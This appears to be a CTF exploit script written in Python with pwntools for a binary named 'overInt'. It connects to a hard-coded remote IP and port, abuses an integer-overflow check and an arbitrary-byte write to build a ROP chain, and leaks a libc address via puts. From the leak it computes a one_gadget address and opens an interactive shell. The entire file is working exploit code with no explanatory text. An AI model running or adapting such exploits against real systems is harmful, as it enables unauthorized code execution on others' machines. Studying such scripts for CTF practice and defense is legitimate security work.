#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
from libnum import *
# context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']

# io = process('./overInt')
# gdb.attach(io, 'b * 0x400aab')
io = remote('58.20.46.151', 35875)
elf = ELF('./overInt')
popRDI=0x400b13
libc = ELF('./libc6_2.23-0ubuntu10_amd64.so')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
def modify(pos,value): #change a value in 8 bytes
    count =0
    for i in range(8):
        count += 1
        success('the {:#x} times'.format(count))
        io.recvuntil('modify?\n')
        io.send(p32(pos+i))
        io.recvuntil('write in?\n')

        payload = n2s(value >> (i*8) & 0xff)
        io.send(payload)
        io.recvuntil('\n')

def rop2(func, arg):
    modify(0x30+8, popRDI)
    modify(0x40, arg)
    modify(0x48, func)
    modify(0x50, 0x4005d0)

'''# explode to a valaid int
firstNum = 0x5f9ccc8e
while 1:
    payload = p32(firstNum)
    success('fistnum -> {:#x}'.format(firstNum))
    io = process('./overInt')
    io.recvuntil(': \n')
    io.send(payload)
    io.recvuntil('key!')
    io.close()
    firstNum +=1
'''
firstNum = 0x5f9ccc8f
io.recvuntil(': \n')
io.send(p32(firstNum))
io.recvuntil('have?')
times = 5 
io.send(p32(times))
io.recvuntil('\n')

for i in range(4):
    io.recvuntil('is: \n')
    io.send(p32(100000000))
    io.recvuntil('\n')

io.recvuntil('is: \n')
io.send(p32(143372146))

io.recvuntil('modify?\n')
io.send(p32(32))

# 可以搜到libc6_2.23-0ubuntu10_amd64
rop2(0x400550, elf.got['puts'])
io.recvuntil('hello!')
puts_addr = u64(io.recvuntil('\n', drop = True).ljust(8, '\x00'))
success('puts_addr -> {:#x}'.format(puts_addr))

raw_input('run again to get shell > ')
firstNum = 0x5f9ccc8f
io.recvuntil(': \n')
io.send(p32(firstNum))
io.recvuntil('have?')
times = 5 
io.send(p32(times))
io.recvuntil('\n')

for i in range(4):
    io.recvuntil('is: \n')
    io.send(p32(100000000))
    io.recvuntil('\n')

io.recv()
# io.recvuntil('is: \n')
io.send(p32(143372146))

io.recvuntil('modify?\n')
io.send(p32(8))
one_gadget = puts_addr - libc.sym['puts'] + 0x45216
raw_input('go')
modify(0x38, one_gadget)
io.interactive()
io.close()
